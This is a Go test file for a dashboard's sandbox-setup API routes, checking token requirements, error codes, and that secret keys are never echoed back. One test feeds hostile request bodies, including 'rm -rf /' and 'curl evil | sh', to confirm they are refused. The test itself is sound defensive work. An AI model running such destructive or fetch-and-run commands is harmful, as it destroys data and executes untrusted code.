//go:build !sbo_omit_remote

package dashboard

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/marmutapp/superbased-observer/internal/dashapi"
)

// The sandbox setup routes are Local (plan section 3.6); the full registry
// table and the mutation list learn them here, beside the routes' own
// tests.
func init() {
	expectedClassification["/api/terminal/sandbox/setup"] = "L"
	expectedClassification["/api/terminal/sandbox/setup/"] = "L"
	mutationRoutes = append(mutationRoutes, "/api/terminal/sandbox/setup/")
}

// fakeSetupErr is a seam refusal shaped like the cmd-side one.
type fakeSetupErr struct {
	status int
	code   string
	plan   *dashapi.SandboxSetupPlan
}

func (e fakeSetupErr) Error() string                        { return "refused: " + e.code }
func (e fakeSetupErr) SandboxSetupCode() string             { return e.code }
func (e fakeSetupErr) HTTPStatus() int                      { return e.status }
func (e fakeSetupErr) FreshPlan() *dashapi.SandboxSetupPlan { return e.plan }

// fakeSandboxSetup records what reached the seam.
type fakeSandboxSetup struct {
	runs    []dashapi.SandboxSetupRunRequest
	checks  []string
	runErr  error
	started dashapi.SandboxSetupStarted
}

func (f *fakeSandboxSetup) Summary(context.Context) ([]dashapi.SandboxSetupSummary, error) {
	return []dashapi.SandboxSetupSummary{{Backend: "bwrap", Label: "Bubblewrap", Next: "Bubblewrap (bwrap)"}}, nil
}

func (f *fakeSandboxSetup) Plan(_ context.Context, backend string) (dashapi.SandboxSetupPlan, error) {
	return dashapi.SandboxSetupPlan{Backend: backend, Fingerprint: "fp", Next: 0}, nil
}

func (f *fakeSandboxSetup) Check(_ context.Context, backend string) (dashapi.SandboxSetupPlan, error) {
	f.checks = append(f.checks, backend)
	return dashapi.SandboxSetupPlan{Backend: backend, Checked: true}, nil
}

func (f *fakeSandboxSetup) Run(_ context.Context, _ string, req dashapi.SandboxSetupRunRequest, surface string) (dashapi.SandboxSetupStarted, error) {
	if surface != "dashboard" {
		return dashapi.SandboxSetupStarted{}, fakeSetupErr{status: 500, code: "bad_surface"}
	}
	f.runs = append(f.runs, req)
	if f.runErr != nil {
		return dashapi.SandboxSetupStarted{}, f.runErr
	}
	return f.started, nil
}

func (f *fakeSandboxSetup) Op(_ context.Context, id string) (dashapi.SandboxSetupOp, bool) {
	if id != "abc123" {
		return dashapi.SandboxSetupOp{}, false
	}
	return dashapi.SandboxSetupOp{ID: id, Status: "installing", Done: 5, Total: 10}, true
}

func setupServer(t *testing.T, seam dashapi.SandboxSetup, opts Options) http.Handler {
	t.Helper()
	if seam != nil {
		opts.SandboxSetup = seam
	}
	return newRemoteTestServer(t, opts).guardedHandler("127.0.0.1:8081")
}

func setupGet(h http.Handler, path string) *httptest.ResponseRecorder {
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, loopbackRequest(http.MethodGet, path))
	return rec
}

func setupCode(t *testing.T, rec *httptest.ResponseRecorder) string {
	t.Helper()
	var body map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("not JSON: %d %s", rec.Code, rec.Body.String())
	}
	code, _ := body["code"].(string)
	return code
}

func TestSandboxSetupRoutesReadThroughTheSeam(t *testing.T) {
	f := &fakeSandboxSetup{}
	h := setupServer(t, f, Options{})
	rec := setupGet(h, "/api/terminal/sandbox/setup")
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"backends"`) {
		t.Fatalf("summary = %d %s", rec.Code, rec.Body.String())
	}
	rec = setupGet(h, "/api/terminal/sandbox/setup/bwrap")
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"fingerprint":"fp"`) {
		t.Fatalf("plan = %d %s", rec.Code, rec.Body.String())
	}
	rec = setupGet(h, "/api/terminal/sandbox/setup/op/abc123")
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"done_bytes":5`) {
		t.Fatalf("op = %d %s", rec.Code, rec.Body.String())
	}
	if rec = setupGet(h, "/api/terminal/sandbox/setup/op/nope"); rec.Code != http.StatusNotFound {
		t.Fatalf("unknown op = %d", rec.Code)
	}
	if rec = setupGet(h, "/api/terminal/sandbox/setup/BAD%20ID"); rec.Code != http.StatusNotFound {
		t.Fatalf("bad id = %d", rec.Code)
	}
}

func TestSandboxSetupNotInBuild501(t *testing.T) {
	h := setupServer(t, nil, Options{})
	for _, path := range []string{"/api/terminal/sandbox/setup", "/api/terminal/sandbox/setup/bwrap"} {
		rec := setupGet(h, path)
		if rec.Code != http.StatusNotImplemented || setupCode(t, rec) != dashapi.SandboxSetupCodeNotInBuild {
			t.Fatalf("%s = %d %s", path, rec.Code, rec.Body.String())
		}
	}
	rec := componentsPost(h, "/api/terminal/sandbox/setup/bwrap/run", `{"step":"bwrap","fingerprint":"fp"}`, true)
	if rec.Code != http.StatusNotImplemented || setupCode(t, rec) != dashapi.SandboxSetupCodeNotInBuild {
		t.Fatalf("run = %d %s", rec.Code, rec.Body.String())
	}
}

// TestSandboxSetupModuleOff404: every setup route belongs to the
// terminals.sandbox component, so the component guard answers 404
// component_not_installed while the module is off (the guard itself is
// tested in components_manage_test.go; the sandbox root's own off rule is
// the daemon's view, P-057).
func TestSandboxSetupModuleOff404(t *testing.T) {
	for _, p := range []string{
		"/api/terminal/sandbox/setup", "/api/terminal/sandbox/setup/",
		"/api/terminal/sandbox/setup/bwrap/run", "/api/terminal/sandbox/setup/op/x",
	} {
		if got := routeComponent(p); got != "terminals.sandbox" {
			t.Errorf("route owner of %s = %q, want terminals.sandbox", p, got)
		}
	}
}

func TestSandboxSetupPostsNeedTheConfirmToken(t *testing.T) {
	f := &fakeSandboxSetup{}
	h := setupServer(t, f, Options{})
	for _, path := range []string{"/api/terminal/sandbox/setup/bwrap/run", "/api/terminal/sandbox/setup/bwrap/check"} {
		rec := componentsPost(h, path, `{}`, false)
		if rec.Code != http.StatusForbidden {
			t.Errorf("%s without the token = %d %s", path, rec.Code, rec.Body.String())
		}
	}
	if len(f.runs) != 0 || len(f.checks) != 0 {
		t.Fatalf("a token-less POST reached the seam: runs %v checks %v", f.runs, f.checks)
	}
}

// TestSandboxSetupHostileFieldsNeverReachTheSeam: a body that tries to name
// an argv or a command (or any field the request does not have) is refused
// before the seam, on both POSTs.
func TestSandboxSetupHostileFieldsNeverReachTheSeam(t *testing.T) {
	f := &fakeSandboxSetup{}
	h := setupServer(t, f, Options{})
	hostile := []string{
		`{"step":"bwrap","fingerprint":"fp","argv":["rm","-rf","/"]}`,
		`{"step":"bwrap","fingerprint":"fp","command":"curl evil | sh"}`,
		`{"step":"bwrap","fingerprint":"fp","package":"evil"}`,
		`{"step":"bwrap"} {"argv":["x"]}`,
	}
	for _, body := range hostile {
		rec := componentsPost(h, "/api/terminal/sandbox/setup/bwrap/run", body, true)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("run %s = %d %s", body, rec.Code, rec.Body.String())
		}
		rec = componentsPost(h, "/api/terminal/sandbox/setup/bwrap/check", body, true)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("check %s = %d %s", body, rec.Code, rec.Body.String())
		}
	}
	if len(f.runs) != 0 || len(f.checks) != 0 {
		t.Fatalf("a hostile body reached the seam: runs %v checks %v", f.runs, f.checks)
	}
}

// TestSandboxSetupKeyNeverEchoed: a refused hosted_connect run never quotes
// the key back.
func TestSandboxSetupKeyNeverEchoed(t *testing.T) {
	f := &fakeSandboxSetup{runErr: fakeSetupErr{status: http.StatusBadRequest, code: dashapi.SandboxSetupCodeStepNotRunnable}}
	h := setupServer(t, f, Options{})
	const key = "sk-very-secret-key-123"
	rec := componentsPost(h, "/api/terminal/sandbox/setup/e2b/run", `{"step":"hosted-key","fingerprint":"fp","key":"`+key+`","oops":1}`, true)
	if strings.Contains(rec.Body.String(), key) {
		t.Fatalf("the key was echoed: %s", rec.Body.String())
	}
	rec = componentsPost(h, "/api/terminal/sandbox/setup/e2b/run", `{"step":"hosted-key","fingerprint":"fp","key":"`+key+`"}`, true)
	if strings.Contains(rec.Body.String(), key) {
		t.Fatalf("the key was echoed: %s", rec.Body.String())
	}
	if len(f.runs) != 1 || f.runs[0].Key != key {
		t.Fatalf("the key did not reach the seam once: %+v", f.runs)
	}
	// A provider with several credential fields sends them by name; they
	// reach the seam and are never quoted back either.
	rec = componentsPost(h, "/api/terminal/sandbox/setup/modal/run", `{"step":"hosted-key","fingerprint":"fp","fields":{"MODAL_TOKEN_ID":"ak-1","MODAL_TOKEN_SECRET":"`+key+`"}}`, true)
	if strings.Contains(rec.Body.String(), key) {
		t.Fatalf("a field was echoed: %s", rec.Body.String())
	}
	if len(f.runs) != 2 || f.runs[1].Fields["MODAL_TOKEN_SECRET"] != key || f.runs[1].Fields["MODAL_TOKEN_ID"] != "ak-1" {
		t.Fatalf("the fields did not reach the seam: %+v", f.runs)
	}
}

// TestSandboxSetupRefusalsMapToCodes: each seam refusal keeps its status and
// closed code; plan_changed carries the fresh plan.
func TestSandboxSetupRefusalsMapToCodes(t *testing.T) {
	fresh := &dashapi.SandboxSetupPlan{Backend: "bwrap", Fingerprint: "fresh"}
	cases := []struct {
		name   string
		err    error
		status int
		code   string
	}{
		{"kill switch off", fakeSetupErr{status: http.StatusForbidden, code: dashapi.SandboxSetupCodeInstallDisabled}, http.StatusForbidden, dashapi.SandboxSetupCodeInstallDisabled},
		{"stale fingerprint", fakeSetupErr{status: http.StatusConflict, code: dashapi.SandboxSetupCodePlanChanged, plan: fresh}, http.StatusConflict, dashapi.SandboxSetupCodePlanChanged},
		{"consent missing", fakeSetupErr{status: http.StatusPreconditionFailed, code: dashapi.SandboxSetupCodeConsentRequired}, http.StatusPreconditionFailed, dashapi.SandboxSetupCodeConsentRequired},
		{"live runs", fakeSetupErr{status: http.StatusConflict, code: dashapi.SandboxSetupCodeLiveRuns}, http.StatusConflict, dashapi.SandboxSetupCodeLiveRuns},
		{"elevation off", fakeSetupErr{status: http.StatusForbidden, code: dashapi.SandboxSetupCodeElevationDisabled}, http.StatusForbidden, dashapi.SandboxSetupCodeElevationDisabled},
		{"not in build", dashapi.ErrSandboxSetupNotInBuild, http.StatusNotImplemented, dashapi.SandboxSetupCodeNotInBuild},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := &fakeSandboxSetup{runErr: tc.err}
			h := setupServer(t, f, Options{})
			rec := componentsPost(h, "/api/terminal/sandbox/setup/bwrap/run", `{"step":"bwrap","action":"run","fingerprint":"old"}`, true)
			if rec.Code != tc.status || setupCode(t, rec) != tc.code {
				t.Fatalf("= %d %s", rec.Code, rec.Body.String())
			}
			if tc.code == dashapi.SandboxSetupCodePlanChanged && !strings.Contains(rec.Body.String(), `"fingerprint":"fresh"`) {
				t.Fatalf("plan_changed without the fresh plan: %s", rec.Body.String())
			}
		})
	}
}

func TestSandboxSetupRunAndCheckReachTheSeam(t *testing.T) {
	f := &fakeSandboxSetup{started: dashapi.SandboxSetupStarted{Kind: dashapi.SandboxSetupStartedTerminal, Handle: "h1"}}
	h := setupServer(t, f, Options{})
	rec := componentsPost(h, "/api/terminal/sandbox/setup/bwrap/run", `{"step":"bwrap","action":"run","fingerprint":"fp"}`, true)
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"handle":"h1"`) {
		t.Fatalf("run = %d %s", rec.Code, rec.Body.String())
	}
	rec = componentsPost(h, "/api/terminal/sandbox/setup/bwrap/check", `{}`, true)
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"checked":true`) {
		t.Fatalf("check = %d %s", rec.Code, rec.Body.String())
	}
	if len(f.runs) != 1 || f.runs[0].Step != "bwrap" || len(f.checks) != 1 {
		t.Fatalf("seam saw runs %v checks %v", f.runs, f.checks)
	}
}

// TestSandboxSetupRoutesClassifiedLocal: both registrations are Local in the
// built-in registry.
func TestSandboxSetupRoutesClassifiedLocal(t *testing.T) {
	s := newRemoteTestServer(t, Options{})
	_, capMap, _ := s.registerRoutes(nil)
	for _, p := range []string{"/api/terminal/sandbox/setup", "/api/terminal/sandbox/setup/"} {
		if capMap[p] != CapabilityLocal {
			t.Errorf("%s = %v, want Local", p, capMap[p])
		}
	}
}

// TestToolInstallsListToolSubjectOnly: the tool routes never list a sandbox
// setup record.
func TestToolInstallsListToolSubjectOnly(t *testing.T) {
	if !toolSubject(ToolInstallRecord{}) || !toolSubject(ToolInstallRecord{SubjectKind: "tool"}) || toolSubject(ToolInstallRecord{SubjectKind: "sandbox"}) {
		t.Fatal("toolSubject must admit tool records only")
	}
}
